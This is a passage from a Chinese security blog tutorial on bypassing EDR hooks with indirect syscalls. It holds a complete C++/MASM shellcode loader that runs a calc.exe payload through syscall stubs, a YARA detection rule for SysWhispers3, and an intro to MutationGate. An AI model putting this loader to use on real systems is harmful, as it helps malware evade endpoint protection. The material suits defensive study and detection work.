</span></span><span style="display:flex;"><span> PIMAGE_EXPORT_DIRECTORY pImgExportDir <span style="color:#f92672">=</span> (PIMAGE_EXPORT_DIRECTORY)(pBase <span style="color:#f92672">+</span> ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
</span></span><span style="display:flex;"><span> PDWORD FunctionNameArray <span style="color:#f92672">=</span> (PDWORD)(pBase <span style="color:#f92672">+</span> pImgExportDir<span style="color:#f92672">-&gt;</span>AddressOfNames);
</span></span><span style="display:flex;"><span> PDWORD FunctionAddressArray <span style="color:#f92672">=</span> (PDWORD)(pBase <span style="color:#f92672">+</span> pImgExportDir<span style="color:#f92672">-&gt;</span>AddressOfFunctions);
</span></span><span style="display:flex;"><span> PWORD  FunctionOrdinalArray <span style="color:#f92672">=</span> (PWORD)(pBase <span style="color:#f92672">+</span> pImgExportDir<span style="color:#f92672">-&gt;</span>AddressOfNameOrdinals);
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">for</span> (DWORD i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> pImgExportDir<span style="color:#f92672">-&gt;</span>NumberOfFunctions; i<span style="color:#f92672">++</span>)
</span></span><span style="display:flex;"><span> {
</span></span><span style="display:flex;"><span>  CHAR<span style="color:#f92672">*</span> pFunctionName <span style="color:#f92672">=</span> (CHAR<span style="color:#f92672">*</span>)(pBase <span style="color:#f92672">+</span> FunctionNameArray[i]);
</span></span><span style="display:flex;"><span>  PBYTE pFunctionAddress <span style="color:#f92672">=</span> (PBYTE)(pBase <span style="color:#f92672">+</span> FunctionAddressArray[FunctionOrdinalArray[i]]);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (_stricmp(funcName, pFunctionName) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>   syscall <span style="color:#f92672">=</span> (pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x12</span>);
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">return</span> syscall;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span> }
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span> HMODULE ntdll;
</span></span><span style="display:flex;"><span> HMODULE kernel32;
</span></span><span style="display:flex;"><span> GetModule(<span style="color:#f92672">&amp;</span>ntdll, <span style="color:#f92672">&amp;</span>kernel32);
</span></span><span style="display:flex;"><span> printf(<span style="color:#e6db74">&#34;ntdll base address: %p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, ntdll);
</span></span><span style="display:flex;"><span> printf(<span style="color:#e6db74">&#34;kernel32 base address: %p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, kernel32);
</span></span><span style="display:flex;"><span> PBYTE syscall_addr <span style="color:#f92672">=</span> GetSyscallAddr(ntdll, <span style="color:#e6db74">&#34;NtOpenProcess&#34;</span>);
</span></span><span style="display:flex;"><span> printf(<span style="color:#e6db74">&#34;Address of syscall instruction is 0x%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, syscall_addr);
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>这样，我们成功地获得了一条 syscall 指令的地址，与我们在 WinDBG 中查看到的一致。</p>
<p><img src="https://raw.githubusercontent.com/iselt/ImageBed/main/20240324160132.png" alt="20240324160132" /></p>
<p><img src="https://raw.githubusercontent.com/iselt/ImageBed/main/20240324160141.png" alt="20240324160141" /></p>
<p>有了 syscall 指令的地址，那么可以得到如下代码(依旧启用 masm)：</p>
<p><strong>indirectsyscall.cpp</strong> 代码</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;windows.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;winternl.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdint.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">extern</span> <span style="color:#e6db74">&#34;C&#34;</span> {
</span></span><span style="display:flex;"><span> UINT_PTR syscall_addr1;
</span></span><span style="display:flex;"><span> UINT_PTR syscall_addr2;
</span></span><span style="display:flex;"><span> UINT_PTR syscall_addr3;
</span></span><span style="display:flex;"><span> UINT_PTR syscall_addr4;
</span></span><span style="display:flex;"><span> UINT_PTR syscall_addr5;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">_PS_ATTRIBUTE</span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span> ULONG  Attribute;
</span></span><span style="display:flex;"><span> SIZE_T Size;
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">union</span>
</span></span><span style="display:flex;"><span> {
</span></span><span style="display:flex;"><span>  ULONG Value;
</span></span><span style="display:flex;"><span>  PVOID ValuePtr;
</span></span><span style="display:flex;"><span> } u1;
</span></span><span style="display:flex;"><span> PSIZE_T ReturnLength;
</span></span><span style="display:flex;"><span>} PS_ATTRIBUTE, <span style="color:#f92672">*</span> PPS_ATTRIBUTE;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">_PS_ATTRIBUTE_LIST</span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span> SIZE_T       TotalLength;
</span></span><span style="display:flex;"><span> PS_ATTRIBUTE Attributes[<span style="color:#ae81ff">1</span>];
</span></span><span style="display:flex;"><span>} PS_ATTRIBUTE_LIST, <span style="color:#f92672">*</span> PPS_ATTRIBUTE_LIST;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>EXTERN_C NTSTATUS <span style="color:#a6e22e">NtAllocateVirtualMemory</span>(
</span></span><span style="display:flex;"><span> IN HANDLE ProcessHandle,
</span></span><span style="display:flex;"><span> IN OUT PVOID<span style="color:#f92672">*</span> BaseAddress,
</span></span><span style="display:flex;"><span> IN ULONG ZeroBits,
</span></span><span style="display:flex;"><span> IN OUT PSIZE_T RegionSize,
</span></span><span style="display:flex;"><span> IN ULONG AllocationType,
</span></span><span style="display:flex;"><span> IN ULONG Protect);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>EXTERN_C NTSTATUS <span style="color:#a6e22e">NtWriteVirtualMemory</span>(
</span></span><span style="display:flex;"><span> IN HANDLE ProcessHandle,
</span></span><span style="display:flex;"><span> IN PVOID BaseAddress,
</span></span><span style="display:flex;"><span> IN PVOID Buffer,
</span></span><span style="display:flex;"><span> IN SIZE_T NumberOfBytesToWrite,
</span></span><span style="display:flex;"><span> OUT PSIZE_T NumberOfBytesWritten OPTIONAL);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>EXTERN_C NTSTATUS <span style="color:#a6e22e">NtCreateThreadEx</span>(
</span></span><span style="display:flex;"><span> OUT PHANDLE ThreadHandle,
</span></span><span style="display:flex;"><span> IN ACCESS_MASK DesiredAccess,
</span></span><span style="display:flex;"><span> IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
</span></span><span style="display:flex;"><span> IN HANDLE ProcessHandle,
</span></span><span style="display:flex;"><span> IN PVOID StartRoutine,
</span></span><span style="display:flex;"><span> IN PVOID Argument OPTIONAL,
</span></span><span style="display:flex;"><span> IN ULONG CreateFlags,
</span></span><span style="display:flex;"><span> IN SIZE_T ZeroBits,
</span></span><span style="display:flex;"><span> IN SIZE_T StackSize,
</span></span><span style="display:flex;"><span> IN SIZE_T MaximumStackSize,
</span></span><span style="display:flex;"><span> IN PPS_ATTRIBUTE_LIST AttributeList OPTIONAL);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>EXTERN_C NTSTATUS <span style="color:#a6e22e">NtWaitForSingleObject</span>(
</span></span><span style="display:flex;"><span> IN HANDLE ObjectHandle,
</span></span><span style="display:flex;"><span> IN BOOLEAN Alertable,
</span></span><span style="display:flex;"><span> IN PLARGE_INTEGER TimeOut OPTIONAL);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>EXTERN_C NTSTATUS <span style="color:#a6e22e">NtClose</span>(
</span></span><span style="display:flex;"><span> IN HANDLE Handle);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">GetModule</span>(HMODULE<span style="color:#f92672">*</span> ntdll, HMODULE<span style="color:#f92672">*</span> kernel32)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span> PPEB peb <span style="color:#f92672">=</span> (PPEB)(__readgsqword(<span style="color:#ae81ff">0x60</span>));
</span></span><span style="display:flex;"><span> PPEB_LDR_DATA ldr <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(PPEB_LDR_DATA<span style="color:#f92672">*</span>)((PBYTE)peb <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x18</span>); <span style="color:#75715e">//PPEB_LDR_DATA pLdr = pPeb-&gt;Ldr;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> PLIST_ENTRY ntdlllistentry <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(PLIST_ENTRY<span style="color:#f92672">*</span>)((PBYTE)ldr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x30</span>);
</span></span><span style="display:flex;"><span> <span style="color:#f92672">*</span>ntdll <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(HMODULE<span style="color:#f92672">*</span>)((PBYTE)ntdlllistentry <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>);
</span></span><span style="display:flex;"><span> PLIST_ENTRY kernelbaselistentry <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(PLIST_ENTRY<span style="color:#f92672">*</span>)((PBYTE)ntdlllistentry);
</span></span><span style="display:flex;"><span> PLIST_ENTRY kernel32listentry <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(PLIST_ENTRY<span style="color:#f92672">*</span>)((PBYTE)kernelbaselistentry);
</span></span><span style="display:flex;"><span> <span style="color:#f92672">*</span>kernel32 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(HMODULE<span style="color:#f92672">*</span>)((PBYTE)kernel32listentry <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>UINT_PTR <span style="color:#a6e22e">GetSyscallAddr</span>(IN HMODULE hModule, <span style="color:#66d9ef">const</span> CHAR<span style="color:#f92672">*</span> funcName)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span> PBYTE pBase <span style="color:#f92672">=</span> (PBYTE)hModule;
</span></span><span style="display:flex;"><span> UINT_PTR syscall;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> PIMAGE_DOS_HEADER pImgDosHdr <span style="color:#f92672">=</span> (PIMAGE_DOS_HEADER)pBase;
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">if</span> (pImgDosHdr<span style="color:#f92672">-&gt;</span>e_magic <span style="color:#f92672">!=</span> IMAGE_DOS_SIGNATURE)
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span> PIMAGE_NT_HEADERS pImgNtHdrs <span style="color:#f92672">=</span> (PIMAGE_NT_HEADERS)(pBase <span style="color:#f92672">+</span> pImgDosHdr<span style="color:#f92672">-&gt;</span>e_lfanew);
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">if</span> (pImgNtHdrs<span style="color:#f92672">-&gt;</span>Signature <span style="color:#f92672">!=</span> IMAGE_NT_SIGNATURE)
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> IMAGE_OPTIONAL_HEADER ImgOptHdr <span style="color:#f92672">=</span> pImgNtHdrs<span style="color:#f92672">-&gt;</span>OptionalHeader;
</span></span><span style="display:flex;"><span> PIMAGE_EXPORT_DIRECTORY pImgExportDir <span style="color:#f92672">=</span> (PIMAGE_EXPORT_DIRECTORY)(pBase <span style="color:#f92672">+</span> ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
</span></span><span style="display:flex;"><span> PDWORD FunctionNameArray <span style="color:#f92672">=</span> (PDWORD)(pBase <span style="color:#f92672">+</span> pImgExportDir<span style="color:#f92672">-&gt;</span>AddressOfNames);
</span></span><span style="display:flex;"><span> PDWORD FunctionAddressArray <span style="color:#f92672">=</span> (PDWORD)(pBase <span style="color:#f92672">+</span> pImgExportDir<span style="color:#f92672">-&gt;</span>AddressOfFunctions);
</span></span><span style="display:flex;"><span> PWORD  FunctionOrdinalArray <span style="color:#f92672">=</span> (PWORD)(pBase <span style="color:#f92672">+</span> pImgExportDir<span style="color:#f92672">-&gt;</span>AddressOfNameOrdinals);
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">for</span> (DWORD i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> pImgExportDir<span style="color:#f92672">-&gt;</span>NumberOfFunctions; i<span style="color:#f92672">++</span>)
</span></span><span style="display:flex;"><span> {
</span></span><span style="display:flex;"><span>  CHAR<span style="color:#f92672">*</span> pFunctionName <span style="color:#f92672">=</span> (CHAR<span style="color:#f92672">*</span>)(pBase <span style="color:#f92672">+</span> FunctionNameArray[i]);
</span></span><span style="display:flex;"><span>  PBYTE pFunctionAddress <span style="color:#f92672">=</span> (PBYTE)(pBase <span style="color:#f92672">+</span> FunctionAddressArray[FunctionOrdinalArray[i]]);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (_stricmp(funcName, pFunctionName) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>   syscall <span style="color:#f92672">=</span> (UINT_PTR)(pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x12</span>);
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">return</span> syscall;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span> }
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span> HMODULE ntdll;
</span></span><span style="display:flex;"><span> HMODULE kernel32;
</span></span><span style="display:flex;"><span> GetModule(<span style="color:#f92672">&amp;</span>ntdll, <span style="color:#f92672">&amp;</span>kernel32);
</span></span><span style="display:flex;"><span> printf(<span style="color:#e6db74">&#34;ntdll base address: %p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, ntdll);
</span></span><span style="display:flex;"><span> printf(<span style="color:#e6db74">&#34;kernel32 base address: %p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, kernel32);
</span></span><span style="display:flex;"><span> syscall_addr1 <span style="color:#f92672">=</span> GetSyscallAddr(ntdll, <span style="color:#e6db74">&#34;NtOpenProcess&#34;</span>);
</span></span><span style="display:flex;"><span> syscall_addr2 <span style="color:#f92672">=</span> syscall_addr1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x20</span>;
</span></span><span style="display:flex;"><span> syscall_addr3 <span style="color:#f92672">=</span> syscall_addr1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x40</span>;
</span></span><span style="display:flex;"><span> syscall_addr4 <span style="color:#f92672">=</span> syscall_addr1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x60</span>;
</span></span><span style="display:flex;"><span> syscall_addr5 <span style="color:#f92672">=</span> syscall_addr1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x80</span>;
</span></span><span style="display:flex;"><span> printf(<span style="color:#e6db74">&#34;Address of syscall instruction is 0x%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, syscall_addr1);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> code[] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\x31\xd2\x65\x48\x8b\x42\x60\x48\x8b\x70\x18\x48\x8b\x76\x20\x4c\x8b\x0e\x4d\x8b\x09\x4d\x8b\x49\x20\xeb\x63\x41\x8b\x49\x3c\x4d\x31\xff\x41\xb7\x88\x4d\x01\xcf\x49\x01\xcf\x45\x8b\x3f\x4d\x01\xcf\x41\x8b\x4f\x18\x45\x8b\x77\x20\x4d\x01\xce\xe3\x3f\xff\xc9\x48\x31\xf6\x41\x8b\x34\x8e\x4c\x01\xce\x48\x31\xc0\x48\x31\xd2\xfc\xac\x84\xc0\x74\x07\xc1\xca\x0d\x01\xc2\xeb\xf4\x44\x39\xc2\x75\xda\x45\x8b\x57\x24\x4d\x01\xca\x41\x0f\xb7\x0c\x4a\x45\x8b\x5f\x1c\x4d\x01\xcb\x41\x8b\x04\x8b\x4c\x01\xc8\xc3\xc3\x41\xb8\x98\xfe\x8a\x0e\xe8\x92\xff\xff\xff\x48\x31\xc9\x51\x48\xb9\x63\x61\x6c\x63\x2e\x65\x78\x65\x51\x48\x8d\x0c\x24\x48\x31\xd2\x48\xff\xc2\x48\x83\xec\x28\xff\xd0</span><span style="color:#e6db74">&#34;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> LPVOID allocation_start;
</span></span><span style="display:flex;"><span> SIZE_T allocation_size <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(code);
</span></span><span style="display:flex;"><span> HANDLE hThread;
</span></span><span style="display:flex;"><span> NTSTATUS status;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> allocation_start <span style="color:#f92672">=</span> <span style="color:#66d9ef">nullptr</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e">// Allocate Virtual Memory 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> <span style="color:#66d9ef">if</span> (NtAllocateVirtualMemory(GetCurrentProcess(), <span style="color:#f92672">&amp;</span>allocation_start, <span style="color:#ae81ff">0</span>, (PULONG64)<span style="color:#f92672">&amp;</span>allocation_size, MEM_COMMIT <span style="color:#f92672">|</span> MEM_RESERVE, PAGE_EXECUTE_READWRITE) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>  printf(<span style="color:#e6db74">&#34;Memory allocated at %p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, allocation_start);
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>  printf(<span style="color:#e6db74">&#34;Allocated failed, Error code is %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, GetLastError());
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e">// Copy shellcode into allocated memory
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> <span style="color:#66d9ef">if</span> (NtWriteVirtualMemory(GetCurrentProcess(), allocation_start, code, <span style="color:#66d9ef">sizeof</span>(code), <span style="color:#ae81ff">0</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>  printf(<span style="color:#e6db74">&#34;Copied successfully</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>  printf(<span style="color:#e6db74">&#34;Copied failed, Error code is %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, GetLastError());
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">if</span> (NtCreateThreadEx(<span style="color:#f92672">&amp;</span>hThread, GENERIC_EXECUTE, NULL, GetCurrentProcess(), (LPTHREAD_START_ROUTINE)allocation_start, NULL, FALSE, NULL, NULL, NULL, NULL) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>  printf(<span style="color:#e6db74">&#34;Executed successfully</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>  printf(<span style="color:#e6db74">&#34;Executed failed, Error code is %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, GetLastError());
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> <span style="color:#75715e">// Wait for the end of the thread and close the handle
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> NtWaitForSingleObject(hThread, FALSE, NULL);
</span></span><span style="display:flex;"><span> NtClose(hThread);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><strong>stub.asm</strong> 代码：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>EXTERN syscall_addr1:QWORD 
</span></span><span style="display:flex;"><span>EXTERN syscall_addr2:QWORD 
</span></span><span style="display:flex;"><span>EXTERN syscall_addr3:QWORD 
</span></span><span style="display:flex;"><span>EXTERN syscall_addr4:QWORD 
</span></span><span style="display:flex;"><span>EXTERN syscall_addr5:QWORD 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>.code
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>NtAllocateVirtualMemory PROC
</span></span><span style="display:flex;"><span>    mov r10, rcx
</span></span><span style="display:flex;"><span>    mov rax, <span style="color:#ae81ff">18</span>h
</span></span><span style="display:flex;"><span>    jmp QWORD PTR [syscall_addr1]
</span></span><span style="display:flex;"><span>    ret
</span></span><span style="display:flex;"><span>NtAllocateVirtualMemory ENDP
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>NtWriteVirtualMemory PROC
</span></span><span style="display:flex;"><span>    mov r10, rcx
</span></span><span style="display:flex;"><span>    mov rax, <span style="color:#ae81ff">3</span>Ah
</span></span><span style="display:flex;"><span>    jmp QWORD PTR [syscall_addr2]
</span></span><span style="display:flex;"><span>    ret
</span></span><span style="display:flex;"><span>NtWriteVirtualMemory ENDP
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>NtCreateThreadEx PROC
</span></span><span style="display:flex;"><span>    mov r10, rcx
</span></span><span style="display:flex;"><span>    mov rax, <span style="color:#ae81ff">0</span>C2h
</span></span><span style="display:flex;"><span>    jmp QWORD PTR [syscall_addr3]
</span></span><span style="display:flex;"><span>    ret
</span></span><span style="display:flex;"><span>NtCreateThreadEx ENDP
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>NtWaitForSingleObject PROC
</span></span><span style="display:flex;"><span>    mov r10, rcx
</span></span><span style="display:flex;"><span>    mov rax, <span style="color:#ae81ff">4</span>
</span></span><span style="display:flex;"><span>    jmp QWORD PTR [syscall_addr4]
</span></span><span style="display:flex;"><span>    ret
</span></span><span style="display:flex;"><span>NtWaitForSingleObject ENDP
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>NtClose PROC
</span></span><span style="display:flex;"><span>    mov r10, rcx
</span></span><span style="display:flex;"><span>    mov rax, <span style="color:#ae81ff">0F</span>h
</span></span><span style="display:flex;"><span>    jmp QWORD PTR [syscall_addr5]
</span></span><span style="display:flex;"><span>    ret
</span></span><span style="display:flex;"><span>NtClose ENDP
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>end
</span></span></code></pre></div><p>我们在 C 代码里定义了全局变量 syscall_addr，因为该项目实际上还是 C++ 项目，所以需要稍微注意一下格式。出于演示程序的成功执行目的，我选择了 5 个连续的 syscall 指令的地址，如果我们想有意地选择良性 NTAPI 的 syscall 指令地址，需要仔细斟酌一下选择哪些。</p>
<p><img src="https://raw.githubusercontent.com/iselt/ImageBed/main/20240324160210.png" alt="20240324160210" /></p>
<p>作为小练习，请写出没有混淆 syscall stub 的情况下，采用间接 syscall 调用的程序的 yara 的检测规则。</p>
<h4 id="syswhisper3">
  <strong>syswhisper3</strong>
  <a class="anchor" href="#syswhisper3">#</a>
</h4>
<p>syswhisper3 是对 syswhisper2 的改进，也可以自动生成我们上面编写的间接 syscall 的程序所需要的相关文件。因为原理差不多，就不做额外解释了。</p>
<p><img src="https://raw.githubusercontent.com/iselt/ImageBed/main/20240324160243.png" alt="20240324160243" /></p>
<p>导入所需文件的步骤与 syswhisper2 一致，代码也可以复用之前的。编译后，执行结果如下：</p>
<p><img src="https://raw.githubusercontent.com/iselt/ImageBed/main/20240324160321.png" alt="20240324160321" /></p>
<p>根据 asm 文件里的函数指令，可以创建相应的 yara 规则：</p>
<p><img src="https://raw.githubusercontent.com/iselt/ImageBed/main/20240324160330.png" alt="20240324160330" /></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#ae81ff">rule syswhisper3</span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">meta</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">description = &#34;Hunt for syswhispe3 generated asm code&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">strings</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">$s1 = {48 89 4c 24 08 48 89 54 24 10 4c 89 44 24 18 4c 89 4c 24 20 48 83 ec 28 b9 ?? ?? ?? ?? e8}</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">$s2 = {48 83 c4 28 48 8b 4c 24 08 48 8b 54 24 10 4c 8b 44 24 18 4c 8b 4c 24 20 4c 8b d1}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">condition</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">#s1 &gt;=1 or #s2 &gt;=1 </span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>因为我们导出了所有 NTAPI 的相关文件，匹配数自然很多。</p>
<p><img src="https://raw.githubusercontent.com/iselt/ImageBed/main/20240324160342.png" alt="20240324160342" /></p>
<h3 id="突变之门-mutationgate">
  <strong>突变之门 MutationGate</strong>
  <a class="anchor" href="#%e7%aa%81%e5%8f%98%e4%b9%8b%e9%97%a8-mutationgate">#</a>
</h3>
<p>突变之门 MutationGate 是我在近期的研究成果，其实也是属于间接 syscall 的一种。但毕竟是作者我提出的，所以必须给足牌面，单独安排一个中标题。Github 地址: <a href="https://github.com/senzee1984/MutationGate">https://github.com/senzee1984/MutationGate</a> 以及英文研究文章: <a href="https://winslow1984.com/books/malware/page/mutationgate">https://winslow1984.com/books/malware/page/mutationgate</a></p>
<p>MutationGate 通过利用<strong>硬件断点</strong>来重定向系统调用，从而绕过 EDR 的内联 hook。MutationGate 的原理是调用一个未被 hook 的良性 NTAPI，并用被 hook 的 NTAPI的 SSN 替换这个未被 hook 的 NTAPI 的 SSN。通过这种方式，syscall 被重定向到被 hook 的 NTAPI，而无需加载第 2 个 ntdll 模块或纂改已加载到内存中的 ntdll 模块，就可以绕过内联 hook。</p>
